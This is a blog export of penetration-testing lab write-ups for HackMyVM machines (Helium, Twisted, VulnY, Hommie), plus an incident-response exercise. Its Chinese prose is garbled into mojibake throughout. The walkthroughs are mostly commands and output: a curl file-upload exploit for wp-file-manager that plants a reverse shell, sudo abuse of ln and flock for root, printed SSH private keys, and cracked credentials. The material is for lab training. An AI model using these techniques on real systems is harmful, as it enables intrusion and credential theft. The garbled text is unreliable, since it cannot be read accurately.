ç”¨é£™å‡ï¼Œå‡ºäºèƒ†å­å°ï¼Œå°±ç«‹åˆ»å°†æœåŠ¡å™¨å…³æœºï¼Œå¹¶æ‰¾æ¥æ­£åœ¨åƒè‹•çš®çš„hxdå¸®ä»–åˆ†æï¼Œè¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š\n1.æ”»å‡»è€…çš„shellå¯†ç \n2.æ”»å‡»è€…çš„IPåœ°å€\n3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§°\n4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå)\n5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´\n~~~\n\n# 1.æ”»å‡»è€…çš„shellå¯†ç \n\næ‰“å¼€phpstudyæ‰¾åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç„¶åç”¨Dç›¾æ‰«\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/1.png)\n\nèƒ½æ‰¾åˆ°æ˜¯ä¸€ä¸ªå†°èé©¬ï¼Œå¯†ç æ˜¯rebeyond\n\n# 2.æ”»å‡»è€…çš„IPåœ°å€\n\næŸ¥çœ‹phpstudyçš„æ—¥å¿—æ–‡ä»¶ï¼Œæœ‰apacheå’Œnginxï¼Œnginxçš„æ—¥å¿—å…¨æ˜¯0kbï¼Œæ‰“å¼€apacheçš„access.logæ–‡ä»¶æœç´¢shell.phpèƒ½æ‰¾åˆ°æ”»å‡»è€…çš„ip\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/2.png)\n\n# 3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§°\n\nå¯ä»¥ç›´æ¥æŸ¥çœ‹Cç›˜çš„ç”¨æˆ·æœ‰ä¸€ä¸ªhack168$\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/3.png)\n\næˆ–è€…å¯ä»¥æŸ¥çœ‹ç™»å½•çš„æ—¥å¿—ï¼Œå¦‚æœä¸ç”¨å·¥å…·çš„è¯å°±åœ¨äº‹ä»¶æŸ¥çœ‹å™¨é‡Œ-å®‰å…¨æ‰¾äº‹ä»¶IDä¸º4624çš„äº‹ä»¶\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/4.png)\n\n# 4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå)\n\nåœ¨C:\\Users\\hack168$\\Desktopé‡Œæœ‰ä¸€ä¸ªKuangï¼Œè¿™æ˜¯ä¸€ä¸ªpythonç¼–è¯‘çš„exeæ–‡ä»¶ï¼Œå…ˆè½¬ä¸€ä¸‹pycç„¶ååç¼–è¯‘å°±è¡Œäº†\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/6.png)\n\n# 5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´\n\nphpstudyå°†webæœåŠ¡å¯åŠ¨ï¼Œæ˜¯ä¸€ä¸ªEMGLOGæœåŠ¡ï¼Œåå°çš„è´¦å·å¯†ç æ˜¯admin/123456\n\nhttps://blog.csdn.net/W13680336969/article/details/137267677\n\næ‰“ä¸Šæœ€æ–°çš„è¡¥ä¸ï¼Œå¹¶æŠŠadminçš„å¯†ç æ”¹æ‰\n\n# 6.éé¢„æœŸ\n\næ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªè§£ä½“çš„æ ¡éªŒç¨‹åºï¼Œå’Œkuangä¸€æ ·ï¼Œexe->pycç„¶ååç¼–è¯‘\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-web1/5.png)\n","tags":["é¶æœº"],"categories":["åº”æ€¥å“åº”"]},{"title":"HackmyVM-Helium","url":"/2025/01/26/HackmyVM-Helium/","content":"\n\n\n#  ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.178  08:00:27:d1:eb:7a       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 5 responded\n~~~\n\nipæ˜¯192.168.31.178ï¼Œnmapæ‰«æä¸€ä¸‹ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.178 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 01:27 EST\nNmap scan report for helium (192.168.31.178)\nHost is up (0.0046s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D1:EB:7A (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 20.85 seconds\n~~~\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl 192.168.31.178\n<title>RELAX</title>\n<!doctype html>\n<html lang=\"en\">\n\n<!-- Please paul, stop uploading weird .wav files using /upload_sound -->\n\n<head>\n<style>\nbody {\n  background-image: url('screen-1.jpg');\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: 100% 100%;\n}\n</style>\n    <link href=\"bootstrap.min.css\" rel=\"stylesheet\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n</head>\n\n<body>\n<audio src=\"relax.wav\" preload=\"auto loop\" controls></audio>\n</body>\n~~~\n\næœ‰æ³¨é‡Špaulå¯èƒ½æ˜¯sshçš„è´¦å·ï¼Œrelax.wavä¸‹è½½ä¸‹äº†ä¹‹åæ²¡æœ‰ä¸œè¥¿ï¼Œ/bootstrap.min.cssç»™äº†ä¸€ä¸ªwavæ–‡ä»¶ï¼Œç”¨Audacityåˆ†æé¢‘è°±èƒ½å‘ç°`dancingpassyo`ï¼Œsshç™»å½•è¯•è¯•ï¼Œç™»å½•æˆåŠŸ\n\n# ææƒ\n\n~~~\npaul@MiWiFi-RA71-srv:~$ sudo -l\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\nMatching Defaults entries for paul on MiWiFi-RA71-srv:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser paul may run the following commands on MiWiFi-RA71-srv:\n    (ALL : ALL) NOPASSWD: /usr/bin/ln\n~~~\n\n~~~\npaul@MiWiFi-RA71-srv:~$ sudo ln  -fs /bin/sh /bin/usr/ln\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\nææƒæˆåŠŸ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Twisted","url":"/2025/01/24/HackmyVM-Twisted/","content":"\n# \n\n\n\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.22   08:00:27:63:fe:59       PCS Systemtechnik GmbH\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded\n~~~\n\nipä¸º192.168.31.22.  nmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.22 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 EST\nStats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)\nNmap scan report for twisted (192.168.31.22)\nHost is up (0.0065s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\nMAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 22.61 seconds\n~~~\n\n2222ç«¯å£ä¸ºsshç«¯å£\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl 192.168.31.22\n<h1>I love cats!</h1>\n<img src=\"cat-original.jpg\" alt=\"Cat original\"  width=\"400\" height=\"400\">\n<br>\n\n<h1>But I prefer this one because seems different</h1>\n\n<img src=\"cat-hidden.jpg\" alt=\"Cat Hidden\" width=\"400\" height=\"400\">\n~~~\n\n80ç«¯å£å­˜åœ¨ä¸¤å¼ jpgå›¾ç‰‡\n\nä¸‹è½½ä¸‹äº†ç”¨stegseekæŸ¥çœ‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# stegseek cat-original.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"westlife\"\n[i] Original filename: \"markus.txt\".\n[i] Extracting to \"cat-original.jpg.out\".\n\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# stegseek cat-hidden.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"sexymama\"\n[i] Original filename: \"mateo.txt\".\n[i] Extracting to \"cat-hidden.jpg.out\".\n~~~\n\nç»™äº†ä¸¤ä¸ªsshçš„è´¦å·å¯†ç \n\n# ææƒ\n\nå…ˆç™»å½•markus\n\n~~~\nmarkus@MiWiFi-RA71-srv:~$ cat note.txt\nHi bonita,\nI have saved your id_rsa here: /var/cache/apt/id_rsa\nNobody can find it.\n~~~\n\nç»™äº†ä¸€ä¸ªæç¤ºï¼Œæ˜¯bonitaç”¨æˆ·çš„id_rsa\n\nsuidææƒçœ‹çœ‹\n\n~~~\nmarkus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2>/dev/null\n/home/bonita/beroot\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\n`/home/bonita/beroot`è¿™ä¸ªå¾ˆå¯ç–‘ä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œç™»å½•mateoçœ‹çœ‹\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ cat note.txt\n/var/www/html/gogogo.wav\n~~~\n\nä¸‹è½½ä¸‹äº†ï¼Œç”¨AudacityæŸ¥çœ‹ï¼Œèƒ½å‘ç°è¿™æ˜¯è«æ–¯ï¼Œè§£ç å¾—åˆ°\n\n~~~\nGO DEEPER... COME WITH ME... LITTLE RABBIT...\n~~~\n\næ²¡å•¥ç”¨\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2>/dev/null\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/tail = cap_dac_read_search+ep\n~~~\n\ngetcapå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„ç‰¹æ®Šæƒé™ï¼Œtailå¯ä»¥è¯»å–\n\n~~~\nmateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd\nFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS\nolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1\nvD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF\ngFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C\ntt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM\ngl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC\nxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8\nDcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H\nuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD\nXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu\nU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI\nmZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/\nhmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro\nnxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK\nmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+\nbUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq\nyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP\nUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh\nV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ\nLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz\na0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF\neERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu\nD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\nsshç™»é™†ï¼Œå°†berootä¸‹è½½idaåˆ†æ\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+1Ch] [rbp-4h] BYREF\n\n  printf(\"Enter the code:\\n \");\n  scanf(\"%i\", &v4);\n  if ( v4 == 5880 )\n  {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash\");\n  }\n  else\n  {\n    puts(\"\\nWRONG\");\n  }\n  return 0;\n}\n~~~\n\nåªè¦è¾“å…¥ç­‰äº5880å°±ä¼šæ‰§è¡Œ/bin/bash\n\n~~~\nbonita@MiWiFi-RA71-srv:~$ ./beroot\nEnter the code:\n 5880\nroot@MiWiFi-RA71-srv:~#\n~~~\n\nææƒç»“æŸ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-VulnY","url":"/2025/01/24/HackmyVM-VulnY/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.165  08:00:27:6c:16:9b       PCS Systemtechnik GmbH\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 4 responded\n~~~\n\nipä¸º192.168.31.165 ï¼Œnmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.165 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 00:19 EST\nNmap scan report for vulny (192.168.31.165)\nHost is up (0.049s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n33060/tcp open  mysqlx\nMAC Address: 08:00:27:6C:16:9B (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 28.56 seconds\n~~~\n\nå¼€äº†ä¸€ä¸ªmysqlæœåŠ¡å’Œhttpçš„æœåŠ¡\n\n# 80ç«¯å£\n\næ‰«æç›®å½•èƒ½æ‰«å‡ºæ¥æœ‰ä¸€ä¸ªsecretçš„ç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl http://192.168.31.165/secret/\nNeither <b>/etc/wordpress/config-192.168.31.165.php</b> nor <b>/etc/wordpress/config-168.31.165.php</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username\n~~~\n\næç¤ºäº†è¦å»çœ‹/etc/wordpress/config-168.31.165.phpï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªwordpressçš„æ¡†æ¶ï¼Œwp-contentå­˜åœ¨ç›®å½•éå†\n\nåœ¨`Index of /secret/wp-content/uploads/2020/10`è¿™é‡Œèƒ½å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…wp-file-manager-6.O.zipï¼Œè¿™ä¸ªæ’ä»¶å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ \n\n~~~\ncurl -F cmd=upload -F target=l1_ -F upload[]=@rev.php -XPOST \"http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\"\n~~~\n\nä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„æ–‡ä»¶\n\nè®¿é—®http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php\n\nè¿›è¡Œåå¼¹shell\n\n~~~\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\n# ææƒ\n\ncdè¿›/etc/wordpressï¼Œ\n\n~~~\nwww-data@vulny:/etc/wordpress$ ls\nls\nconfig-192.168.1.122.php  htaccess\n~~~\n\næ–‡ä»¶åå’Œ80ç«¯å£çš„ä¸ä¸€æ ·ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯80ç«¯å£æ˜¯ipåœ°å€è¾“å‡ºçš„æ–‡ä»¶å\n\n~~~\nwww-data@vulny:/etc/wordpress$ cat c*\ncat c*\n<?php\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wordpress');\ndefine('DB_PASSWORD', 'myfuckingpassword');\ndefine('DB_HOST', 'localhost');\ndefine('DB_COLLATE', 'utf8_general_ci');\ndefine('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');\n?>\n~~~\n\nç»™äº†mysqlçš„è´¦å·å¯†ç ï¼Œè¿™è¿˜æœ‰wordpressçš„è·¯å¾„ï¼ŒæŸ¥çœ‹wp-config.phpæœ‰ä¸€è¡Œæ³¨é‡Šå¾ˆçªå‡º\n\n~~~\n/* idrinksomewater */\n~~~\n\nç™»å½•mysqlï¼Œæ‰¾ä¸åˆ°æœ‰ç”¨çš„ä¸œè¥¿\n\næŸ¥çœ‹/etc/passwdæœ‰ä¸€ä¸ªadrianå¯ä»¥ç™»å½•ï¼Œæ³¨é‡Šå°±æ˜¯å¯†ç \n\n~~~\nwww-data@vulny:/usr/share/wordpress$ su adrian\nsu adrian\nPassword: idrinksomewater\n\nadrian@vulny:/usr/share/wordpress$\n~~~\n\n~~~\nadrian@vulny:/$ sudo -l\nsudo -l\nMatching Defaults entries for adrian on vulny:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser adrian may run the following commands on vulny:\n    (ALL : ALL) NOPASSWD: /usr/bin/flock\n~~~\n\n~~~\nadrian@vulny:/$ sudo -u root /usr/bin/flock -u / /bin/bash\nsudo -u root /usr/bin/flock -u / /bin/bash\nroot@vulny:/\n~~~\n\nææƒæˆåŠŸ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Hommie","url":"/2025/01/23/HackmyVM-Hommie/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.116  08:00:27:26:b1:6f       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n~~~\n\nipä¸º192.168.31.116ï¼Œnmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.116 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 EST\nNmap scan report for hommie (192.168.31.116)\nHost is up (0.00041s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 10.27 seconds\n~~~\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl 192.168.31.116\nalexia, Your id_rsa is exposed, please move it!!!!!\nIm fighting regarding reverse shells!\n-nobody\n~~~\n\n80ç«¯å£ç›®å½•ä¹Ÿæ‰«æä¸åˆ°ï¼Œåªç»™äº†ä¸€ä¸ªæç¤ºï¼Œalexiaçš„id_rsaæ³„éœ²äº†ï¼Œå»çœ‹21ç«¯å£\n\n# 21ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ftp anonymous@192.168.31.116\nConnected to 192.168.31.116.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||35772|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n226 Directory send OK.\nftp> ls -al\n229 Entering Extended Passive Mode (|||35347|)\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 .\ndrwxr-xr-x    3 0        113          4096 Sep 30  2020 ..\ndrwxrwxr-x    2 0        113          4096 Jan 23 06:12 .web\n-rw-r--r--    1 0        0               0 Sep 30  2020 index.html\n226 Directory send OK.\nftp> cd .web\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||27864|)\n150 Here comes the directory listing.\n-rw-r--r--    1 106      113            35 Jan 23 06:12 1.phtml\n-rw-r--r--    1 0        0              99 Sep 30  2020 index.html\n-rw-r--r--    1 106      113          5493 Jan 23 06:09 rev.php\n226 Directory send OK.\n~~~\n\n21ç«¯å£æœ‰åŒ¿åç™»å½•ï¼Œå­˜åœ¨.webç›®å½•ï¼Œå¯ä»¥å¾€80ç«¯å£ä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸è§£æphpï¼Œåªèƒ½æ”¾å¼ƒ\n\n# tftp\n\næ‰«æudpç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 EST\nNmap scan report for hommie (192.168.31.116)\nHost is up (0.00053s latency).\n\nPORT      STATE         SERVICE\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open|filtered ntp\n135/udp   closed        msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   closed        snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   closed        syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\nMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.95 seconds\n~~~\n\ntftpçš„æœåŠ¡å¼€ç€ï¼Œç»“åˆ80ç«¯å£ç»™çš„æç¤º\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# tftp 192.168.31.116\ntftp> get id_rsa\n~~~\n\nå¯ä»¥ä¸‹è½½ä¸‹æ¥alexiaçš„id_rsa\n\nsshç™»å½•\n\n# ææƒ\n\næ‰¾æœ‰suidçš„å‘½ä»¤\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2>/dev/null\n/opt/showMetheKey\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/umount\n~~~\n\n`/opt/showMetheKey`å¾ˆå¯ç–‘å•Š,è¿è¡Œä¸€ä¸‹\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7\nV0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y\nRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT\ngCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j\nQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq\nkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI\nM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM\ndgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW\nrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBB